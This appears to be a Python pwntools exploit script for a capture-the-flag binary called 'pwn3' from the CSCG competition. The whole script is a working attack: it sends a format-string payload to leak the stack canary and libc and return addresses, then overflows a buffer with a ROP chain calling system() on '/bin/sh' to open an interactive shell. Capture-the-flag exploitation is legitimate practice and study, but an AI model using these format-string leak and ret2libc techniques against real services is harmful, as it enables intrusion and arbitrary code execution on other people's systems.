#! /usr/bin/python2.7
from pwn import *
#flag_1 = "CSCG{NOW_GET_VOLDEMORT}"
flag_1 = "CSCG{THIS_IS_TEST_FLAG}"
#p = remote("10.100.102.96" , 1024)
p = process("./pwn3")
raw_input("attach gdb")
p.recvuntil("Enter the password of stage 2:")
p.sendline(flag_1)
p.recvuntil("Enter your witch name:")
p.sendline("%1$lx %52$lx %39$lx")
msg = p.recvuntil("enter your magic spell:")
print(msg)
stack_cookie = int(msg.split()[-5],16)
libc_addr = int(msg.split()[-7],16) - 3926019
ret_addr = int(msg.split()[-6],16) + 1110
print("ret {}".format(hex(ret_addr)))
system_addr = libc_addr + 282112
shell = libc_addr + 0x184999
rdi_gadg = int(msg.split()[-6],16) - 2288 + 0xdf3
p.sendline("Expelliarmus\x00"+"A"*251+p64(stack_cookie)+p64(ret_addr)+p64(rdi_gadg)+p64(shell)+p64(system_addr))
p.interactive()